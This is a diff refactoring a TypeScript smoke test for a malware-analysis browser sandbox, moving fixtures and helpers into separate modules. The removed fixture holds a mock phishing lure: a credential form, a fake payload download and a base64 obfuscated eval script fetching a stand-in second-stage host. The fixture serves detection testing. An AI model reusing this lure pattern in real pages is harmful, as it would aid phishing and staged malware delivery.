@@ -1,73 +1,16 @@
 import assert from 'node:assert/strict'
-
-// Exercise the isolated worker; admission and entitlements are tested at the broker.
-process.env.BROWSER_SANDBOX_SKIP_RUN_DB = '1'
 import { existsSync, readdirSync } from 'node:fs'
-import http from 'node:http'
-import type { AddressInfo } from 'node:net'
 import { homedir } from 'node:os'
 import path from 'node:path'
 import WebSocket, { WebSocketServer } from 'ws'
 import { chromium } from 'playwright'
+import { assertFrameEvidence, assertProviderCaptures } from './smoke-browser-sandbox-broker/assertions.ts'
+import { createFixtureServer, downloadBody, downloadHash, payloadDomain } from './smoke-browser-sandbox-broker/fixtures.ts'
+import { listen, onceListening, onceOpen, portFor, waitForPayload } from './smoke-browser-sandbox-broker/support.ts'
+import type { BrokerPayload } from './smoke-browser-sandbox-broker/types.ts'
 
-type BrokerPayload = {
-    type?: string
-    state?: string
-    reason?: string
-    url?: string
-    target?: string
-    title?: string
-    text?: string
-    source?: string
-    tabId?: string
-    level?: string
-    line?: number
-    image?: string | null
-    width?: number
-    height?: number
-    frameQuality?: { looksBlank?: boolean; visibleTextLength?: number; elementCount?: number }
-    torProxyConfigured?: boolean
-    evidence?: {
-        textExcerpt?: string
-        verdict?: string
-        reasons?: string[]
-        communityComments?: string[]
-        indicators?: { domains?: string[]; ips?: string[]; urls?: string[] }
-        obfuscatedScripts?: unknown[]
-        deobfuscationTasks?: Array<{
-            assessment?: string
-            summary?: string
-            decodedPreview?: string
-            indicators?: { domains?: string[]; ips?: string[]; urls?: string[] }
-        }>
-        threatAssociations?: Array<{ name?: string; category?: string; source?: string }>
-    }
-    toolAnalysis?: {
-        toolKind?: string
-        vendorFlagged?: number
-        vendorTotal?: number
-        alertCount?: number
-        communityCommentCount?: number
-        communityComments?: string[]
-        communitySummary?: string
-        extractedSignals?: string[]
-    }
-    webcrackLoad?: {
-        loaded?: boolean
-        sampleBytes?: number
-        reason?: string
-    }
-    networkSummary?: {
-        recentRequests?: Array<{ method?: string; resourceType?: string; status?: number; host?: string; mimeType?: string; initiator?: string; durationMs?: number; url?: string; asn?: string }>
-        downloads?: Array<{ url?: string; fileName?: string; bytes?: number; sha256?: string; hashStatus?: string }>
-    }
-    receivedAt?: number
-    expiresAt?: string
-    suspiciousExtended?: boolean
-    freeExtensionUsed?: boolean
-    paidExtensionUsed?: boolean
-}
-
+// Exercise the isolated worker; admission and entitlements are tested at the broker.
+process.env.BROWSER_SANDBOX_SKIP_RUN_DB = '1'
 process.env.BROWSER_SANDBOX_ALLOW_LOCAL_TARGETS = '1'
 const chromiumCandidate = [
     process.env.CHROMIUM_BIN || '',
@@ -82,77 +25,7 @@ if (chromiumCandidate) process.env.CHROMIUM_BIN = chromiumCandidate
 const { handleOnionSessionSocket } = await import('../src/handlers/onionSession/ws.ts')
 const { extractThreatAssociations } = await import('../src/handlers/onionSession/analysis.ts')
 
-function cachedChromiumCandidates() {
-    const cacheRoot = path.join(homedir(), 'Library', 'Caches', 'ms-playwright')
-    try {
-        return readdirSync(cacheRoot, { withFileTypes: true })
-            .filter(entry => entry.isDirectory() && entry.name.startsWith('chromium_headless_shell-'))
-            .map(entry => path.join(cacheRoot, entry.name, 'chrome-headless-shell-mac-arm64', 'chrome-headless-shell'))
-    } catch {
-        return []
-    }
-}
-
-const payloadDomain = 'payload.example.test'
-const downloadBody = 'sandbox download hash fixture\n'
-const downloadHash = '93389713f66d8ccf6a7968f98a05ad61b3f9bf02667bfd499b9300fa0bb25569'
-const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.body.insertAdjacentHTML("beforeend", "<p>LockBit payload</p>");`).toString('base64')
-const pages = new Map<string, string>([
-    ['/start', `<!doctype html>
-<html><head><title>Initial suspicious page</title></head>
-<body>
-  <main>
-    <h1>Acme invoice verification</h1>
-    <p>LockBit ransomware campaign associated with this lure.</p>
-    <p>Benign API text: document.createElement object.assign el.style should not become copied indicators.</p>
-    <button id="click-proof" style="position:fixed;left:20px;top:20px;width:220px;height:54px;z-index:2" onclick="document.title='Interactive click received';document.getElementById('interaction-proof').textContent='Interactive click received'">Confirm invoice</button>
-    <input id="type-proof" style="position:fixed;left:20px;top:88px;width:220px;height:40px;z-index:2" oninput="document.title='Typed proof: ' + this.value;document.getElementById('type-result').textContent='Typed proof: ' + this.value">
-    <a id="download-proof" href="/payload.bin" download="invoice-payload.bin" style="position:fixed;left:20px;top:140px;width:220px;height:40px;z-index:2">Download invoice payload</a>
-    <p id="interaction-proof" style="margin-top:140px">Interaction pending</p>
-    <p id="type-result">Typed proof pending</p>
-    <form action="https://credential.example.test/login"><input name="email"><input name="password" type="password"></form>
-  </main>
-  <script type="text/plain">eval(atob("${encoded}"));</script>
-  <script>console.log('Target startup welcome'); setTimeout(() => { location.href = "/final" }, 10000)</script>
-</body></html>`],
-    ['/final', `<!doctype html>
-<html><head><title>Final redirect page</title></head>
-<body><main><h1>Final landing</h1><p>Redirect complete after staged invoice lure.</p></main></body></html>`],
-    ['/virustotal', `<!doctype html>
-<html><head><title>VirusTotal fixture</title></head>
-<body><a href="/unexpected-provider-navigation" style="position:fixed;left:0;top:0;width:18px;height:18px">Home</a><main><h1>VirusTotal</h1><p>12/94 security vendors flagged this URL as malicious.</p><p>3 community comments</p></main><script>console.warn('Provider diagnostic only')</script></body></html>`],
-    ['/urlquery', `<!doctype html>
-<html><head><title>urlquery fixture</title></head>
-<body><main><h1>urlquery.net</h1><p>4 alerts were raised for malicious requests.</p><!-- <div class="relative mx-auto"><table><tr><th>Date</th></tr></table></div> --></main></body></html>`],
-    ['/webcrack', `<!doctype html>
-<html><head><title>WebCrack fixture</title></head>
-<body><main><h1>WebCrack</h1><textarea aria-label="source"></textarea><button>Run</button><pre id="out"></pre></main>
-<script>
-document.querySelector('button').addEventListener('click', () => {
-  document.getElementById('out').textContent = document.querySelector('textarea').value
-})
-</script></body></html>`],
-])
-
-const httpServer = http.createServer((request, response) => {
-    const url = new URL(request.url || '/', 'http://127.0.0.1')
-    if (url.pathname === '/payload.bin') {
-        response.writeHead(200, {
-            'content-type': 'application/octet-stream',
-            'content-disposition': 'attachment; filename="invoice-payload.bin"',
-            'cache-control': 'no-store',
-        })
-        response.end(downloadBody)
-        return
-    }
-    const body = pages.get(url.pathname) || pages.get('/start') || ''
-    response.writeHead(200, {
-        'content-type': 'text/html; charset=utf-8',
-        'cache-control': 'no-store',
-    })
-    response.end(body)
-})
-
+const httpServer = createFixtureServer()
 await listen(httpServer)
 const httpPort = portFor(httpServer)
 const base = `http://127.0.0.1:${httpPort}`
@@ -165,14 +38,14 @@ const wsServer = new WebSocketServer({ host: '127.0.0.1', port: 0 })
 await onceListening(wsServer)
 const wsPort = portFor(wsServer)
 
-wsServer.on('connection', (connection) => {
+wsServer.on('connection', connection => {
     handleOnionSessionSocket(connection, `browser-sandbox-smoke-${Date.now().toString(36)}`, 'regular')
 })
 
 const client = new WebSocket(`ws://127.0.0.1:${wsPort}`)
 const payloads: BrokerPayload[] = []
 
-client.on('message', (message) => {
+client.on('message', message => {
     try {
         payloads.push({ ...JSON.parse(message.toString()) as BrokerPayload, receivedAt: Date.now() })
     } catch {
@@ -229,54 +102,10 @@ client.send(JSON.stringify({ type: 'extend', extension: 'paid' }))
 await waitForPayload(payloads, payload => payload.type === 'status' && payload.state === 'payment_required')
 
 const ready = payloads.find(payload => payload.type === 'ready')
-assert.equal(ready?.torProxyConfigured, false, 'regular browser sandbox should not use the Tor proxy')
-
 const pageFrames = payloads.filter(payload => payload.type === 'frame')
-assert(pageFrames.some(payload => payload.reason === 'domcontentloaded'), 'captures DOM-ready browser state')
-assert(pageFrames.some(payload => payload.reason === 'load'), 'captures loaded browser state')
-assert(pageFrames.every(payload => !payload.width || payload.height === Math.round(payload.width * 9 / 16)), 'browser frames stay 16:9')
-assert(pageFrames.some(payload => payload.url?.endsWith('/start')), 'captures initial URL before redirect')
-assert(pageFrames.some(payload => payload.url?.endsWith('/final')), 'captures final URL after redirect')
-assert(pageFrames.some(payload => (payload.image || '').length > 1000), 'captures non-empty screenshots')
-assert(pageFrames.some(payload => payload.frameQuality?.looksBlank === false && (payload.frameQuality.visibleTextLength || 0) > 20 && (payload.frameQuality.elementCount || 0) > 5), 'captures rendered non-blank frame quality metadata')
-assert(pageFrames.some(payload => payload.networkSummary?.recentRequests?.some(request => request.status === 200 && request.method === 'GET' && request.host === '127.0.0.1' && request.mimeType?.includes('text/html') && request.durationMs !== undefined && request.initiator)), 'exposes analyst-grade network request columns')
-assert(pageFrames.some(payload => payload.networkSummary?.downloads?.some(download => download.fileName === 'invoice-payload.bin' && download.bytes === downloadBody.length && download.sha256 === downloadHash && download.hashStatus === 'hashed_and_deleted')), 'hashes downloaded files and reports deletion status')
-
-const initialEvidence = pageFrames.find(payload => payload.url?.endsWith('/start') && payload.evidence?.obfuscatedScripts?.length)?.evidence
-const evidenceIndicators = pageFrames.flatMap(payload => [
-    ...(payload.evidence?.indicators?.domains || []),
-    ...(payload.evidence?.indicators?.ips || []),
-    ...(payload.evidence?.indicators?.urls || []),
-]).map(item => item.toLowerCase())
-assert(!evidenceIndicators.includes('document.createelement') && !evidenceIndicators.includes('object.assign') && !evidenceIndicators.includes('el.style'), 'does not promote generic DOM/API strings to indicators')
-assert(initialEvidence?.obfuscatedScripts?.length, 'extracts obfuscated script candidates')
-assert(initialEvidence?.deobfuscationTasks?.some(task => task.assessment === 'suspicious'), 'summarizes suspicious decoded script')
-assert(initialEvidence?.deobfuscationTasks?.some(task => task.indicators?.domains?.includes(payloadDomain)), 'decoded script exposes second-stage domain')
-assert(initialEvidence?.threatAssociations?.some(item => item.name === 'LockBit'), 'extracts actor/malware context from rendered evidence')
-assert(initialEvidence?.indicators?.domains?.includes('credential.example.test'), 'extracts form-action domain indicators')
-
-const vt = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'virustotal' && payload.toolAnalysis.vendorFlagged !== undefined)
-assert(!payloads.some(payload => payload.url?.includes('/unexpected-provider-navigation')), 'Cookie dismissal must not activate ordinary links with blind clicks or keyboard shortcuts')
-assert.equal(vt?.toolAnalysis?.vendorFlagged, 12)
-assert.equal(vt?.toolAnalysis?.vendorTotal, 94)
-assert.equal(vt?.toolAnalysis?.communityCommentCount, 3)
-assert.deepEqual(vt?.toolAnalysis?.communityComments, [])
-assert((vt?.image || '').length > 1000, 'VirusTotal parsed capture includes a screenshot')
-
-const urlquery = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'urlquery' && payload.toolAnalysis.alertCount !== undefined)
-assert.equal(urlquery?.toolAnalysis?.alertCount, 4)
-assert.equal(urlquery?.toolAnalysis?.communityCommentCount, undefined, 'provider summaries are not miscounted as community comments')
-assert((urlquery?.image || '').length > 1000, 'urlquery parsed capture includes a screenshot')
-assert(!urlquery?.evidence?.comments?.some(comment => /<[^>]+>/.test(comment)), 'provider comments do not leak raw HTML into analyst summaries')
-assert(!/<[^>]+>/.test(urlquery?.toolAnalysis?.communitySummary || ''), 'provider community summary does not leak raw HTML into analyst summaries')
-
-const webcrack = payloads.find(payload => payload.type === 'tool_capture' && payload.toolAnalysis?.toolKind === 'webcrack' && payload.webcrackLoad?.loaded === true)
-assert.equal(webcrack?.webcrackLoad?.loaded, true)
-assert((webcrack?.webcrackLoad?.sampleBytes || 0) > 40, 'loads extracted obfuscated sample into WebCrack fixture')
-assert((webcrack?.image || '').length > 1000, 'WebCrack capture includes a screenshot')
-for (const capture of [vt, urlquery, webcrack]) {
-    assert(capture?.receivedAt && ready?.receivedAt && capture.receivedAt - ready.receivedAt <= 25_000, `${capture?.toolAnalysis?.toolKind || 'provider'} loaded within the provider smoke budget after browser ready`)
-}
+assert.equal(ready?.torProxyConfigured, false, 'regular browser sandbox should not use the Tor proxy')
+assertFrameEvidence(pageFrames, payloadDomain, downloadBody, downloadHash)
+assertProviderCaptures(payloads, ready)
 
 client.send(JSON.stringify({ type: 'end' }))
 await waitForPayload(payloads, payload => payload.type === 'ended')
@@ -294,83 +123,13 @@ console.log(JSON.stringify({
 }, null, 2))
 process.exit(0)
 
-function listen(server: http.Server) {
-    return new Promise<void>((resolve, reject) => {
-        server.once('error', reject)
-        server.listen(0, '127.0.0.1', () => resolve())
-    })
-}
-
-function onceListening(server: WebSocketServer) {
-    return new Promise<void>((resolve) => {
-        if (server.address()) {
-            resolve()
-            return
-        }
-        server.once('listening', () => resolve())
-    })
-}
-
-function onceOpen(socket: WebSocket) {
-    return new Promise<void>((resolve, reject) => {
-        socket.once('open', () => resolve())
-        socket.once('error', reject)
-    })
-}
-
-function portFor(server: http.Server | WebSocketServer) {
-    const address = server.address()
-    assert(address && typeof address !== 'string')
-    return (address as AddressInfo).port
-}
-
-function waitForPayload(payloads: BrokerPayload[], predicate: (payload: BrokerPayload) => boolean, timeoutMs = 20_000) {
-    const started = Date.now()
-
-    return new Promise<BrokerPayload>((resolve, reject) => {
-        const timer = setInterval(() => {
-            const match = payloads.find(predicate)
-            if (match) {
-                clearInterval(timer)
-                resolve(match)
-                return
-            }
-
-            if (Date.now() - started > timeoutMs) {
-                clearInterval(timer)
-                reject(new Error(`Timed out waiting for ${predicate.toString()}. Received: ${JSON.stringify(payloads.slice(-10).map(summarizePayload))}`))
-            }
-        }, 50)
-    })
-}
-
-function summarizePayload(payload: BrokerPayload) {
-    if (payload.type === 'tool_capture') {
-        return {
-            type: payload.type,
-            id: payload.id,
-            url: payload.url,
-            imageBytes: payload.image?.length || 0,
-            toolAnalysis: payload.toolAnalysis,
-            webcrackLoad: payload.webcrackLoad,
-            evidence: payload.evidence ? {
-                verdict: payload.evidence.verdict,
-                reasons: payload.evidence.reasons,
-                obfuscatedScripts: payload.evidence.obfuscatedScripts?.length,
-            } : undefined,
-        }
-    }
-    if (payload.type !== 'frame') return payload
-    return {
-        type: payload.type,
-        reason: payload.reason,
-        url: payload.url,
-        title: payload.title,
-        imageBytes: payload.image?.length || 0,
-        evidence: payload.evidence ? {
-            verdict: payload.evidence.verdict,
-            reasons: payload.evidence.reasons,
-            obfuscatedScripts: payload.evidence.obfuscatedScripts?.length,
-        } : undefined,
+function cachedChromiumCandidates() {
+    const cacheRoot = path.join(homedir(), 'Library', 'Caches', 'ms-playwright')
+    try {
+        return readdirSync(cacheRoot, { withFileTypes: true })
+            .filter(entry => entry.isDirectory() && entry.name.startsWith('chromium_headless_shell-'))
+            .map(entry => path.join(cacheRoot, entry.name, 'chrome-headless-shell-mac-arm64', 'chrome-headless-shell'))
+    } catch {
+        return []
     }
 }
